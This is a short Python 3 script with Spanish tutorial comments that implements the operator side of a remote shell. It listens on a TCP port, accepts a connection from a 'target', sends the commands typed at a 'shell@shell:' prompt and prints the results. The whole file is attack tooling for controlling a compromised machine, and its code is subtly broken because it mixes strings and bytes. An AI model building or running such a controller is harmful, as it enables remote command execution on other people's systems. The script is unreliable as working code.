#! /usr/bin/env python3
#_*_ coding: utf8_*_

import socket
import time

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('localhost',7777)) #Por abajo de los 1024 puertos, solo hay puertos que estan dedicados unicamente a servicios del sistema operativo
    server.listen(1)#Solo esperamos una conexion

    while True:
        time.sleep(1)
        print('Esperando la conexion')
        target, direccion = server.accept() #Podemos declarar dos variables con el mismo valor, separandolos por comas, con accept se aceptan todas las conexiones que vengan a nuetra maquina a traves del puerto que especificamos
        time.sleep(2)
        print('Conexion de: {}'.format(direccion))

        ver = target.recv(1024)
        if ver == '1':
            while True:
                opcion = input("shell@shell: ")
                target.send(opcion)
                resultado = target.recv(2048)
                print(resultado)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Saliendo')
        exit()
